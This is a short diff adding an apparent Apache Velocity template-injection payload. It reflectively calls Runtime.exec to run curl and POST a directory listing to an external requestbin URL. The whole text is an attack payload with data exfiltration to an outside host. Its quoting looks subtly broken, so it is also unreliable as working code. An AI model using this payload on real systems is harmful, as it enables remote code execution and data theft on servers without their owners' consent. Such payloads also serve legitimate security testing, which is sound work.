@@ -1,0 +1,2 @@
+#set($e="e")
+$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("curl -X POST -d "$(ls -la)" http://requestbin.fullcontact.com/1a4i3pj1")
